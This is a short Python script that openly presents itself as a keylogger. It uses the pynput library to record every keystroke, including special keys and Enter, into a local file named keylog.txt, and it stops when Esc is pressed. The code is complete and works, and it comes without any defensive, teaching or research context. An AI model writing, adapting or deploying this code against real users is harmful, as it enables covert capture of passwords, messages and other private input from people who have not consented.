from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n[ENTER]\n")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[+] Keylogger stopped. Check file: keylog.txt")
        return False

print("[+] Keylogger started... (Press 'Esc' to stop)")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
